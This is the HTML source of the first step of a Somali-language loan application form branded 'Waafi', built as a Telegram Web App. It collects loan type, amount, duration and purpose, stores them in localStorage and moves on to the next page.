<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Amaahda - Waafi</title>

    <!-- FIXED Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(to right, #82d13d, #4caf50);
            padding: 15px 20px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        .back-link {
            cursor: pointer;
            font-size: 20px;
            font-weight: 500;
        }

        .waafi-logo {
            font-size: 24px;
            font-weight: bold;
        }

        .form-card {
            background: white;
            width: 90%;
            max-width: 450px;
            margin-top: 30px;
            padding: 30px 20px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            box-sizing: border-box;
        }

        h2 {
            text-align: center;
            margin: 0;
            font-size: 28px;
        }

        .step-info {
            text-align: center;
            font-size: 15px;
            color: #999;
            margin: 8px 0 25px;
        }

        .progress-box {
            display: flex;
            gap: 10px;
            margin-bottom: 35px;
        }

        .bar {
            height: 5px;
            flex: 1;
            background: #e0e0e0;
            border-radius: 10px;
        }

        .active-bar {
            background: #82d13d;
        }

        .input-wrap {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        select, input, textarea {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .next-btn {
            background: linear-gradient(to right, #82d13d, #6ab344);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }

        .footer-text {
            text-align: center;
            font-size: 13px;
            color: #999;
            margin-top: 40px;
            padding-bottom: 20px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div class="back-link" onclick="goBack()">← Dib u noqo</div>
    <div class="waafi-logo">Waafi</div>
    <div style="font-size: 26px;">☰</div>
</div>

<div class="form-card">
    <h2>Codsiga Amaahda</h2>
    <p class="step-info">Tallaabada 1 ee 3</p>

    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Nooca Amaahda</label>
        <select id="loanType">
            <option value="Amaah Shakhsi">Amaah Shakhsi</option>
            <option value="Amaah Ganacsi">Amaah Ganacsi</option>
            <option value="Amaah Baabuur">Amaah Baabuur</option>
            <option value="Amaah Guri">Amaah Guri</option>
            <option value="Amaah Waxbarasho">Amaah Waxbarasho</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>Qaddarka Amaahda ($)</label>
        <input type="number" id="loanAmount" placeholder="1000" value="1000">
    </div>

    <div class="input-wrap">
        <label>Muddada Amaahda</label>
        <select id="loanDuration">
            <option value="3">3 Bilood</option>
            <option value="6">6 Bilood</option>
            <option value="12" selected>12 Bilood</option>
            <option value="18">18 Bilood</option>
            <option value="24">24 Bilood</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>Ujeedada Amaahda</label>
        <textarea id="loanPurpose" rows="3" placeholder="Maxaad u isticmaali doontaa amaahda?"></textarea>
    </div>

    <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
</div>

<div class="footer-text">© 2025 Waafi Soomaaliya</div>

<script>
    function goNext() {
        const amount = document.getElementById('loanAmount').value.trim();
        const purpose = document.getElementById('loanPurpose').value.trim();
        const type = document.getElementById('loanType').value;
        const duration = document.getElementById('loanDuration').value;

        if (!amount || Number(amount) <= 0) {
            alert("Fadlan geli qaddar sax ah.");
            return;
        }

        if (purpose.length < 3) {
            alert("Fadlan sharax ujeedada amaahda.");
            return;
        }

        localStorage.setItem('amount', amount);
        localStorage.setItem('loanPurpose', purpose);
        localStorage.setItem('loanType', type);
        localStorage.setItem('loanDuration', duration);

        // FIXED: must match your Express route system
        window.location.href = "/page3";
    }

    function goBack() {
        window.location.href = "/";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // restore values if user returns
        if (localStorage.getItem('amount')) {
            document.getElementById('loanAmount').value = localStorage.getItem('amount');
        }
        if (localStorage.getItem('loanPurpose')) {
            document.getElementById('loanPurpose').value = localStorage.getItem('loanPurpose');
        }
    };
</script>

</body>
</html>
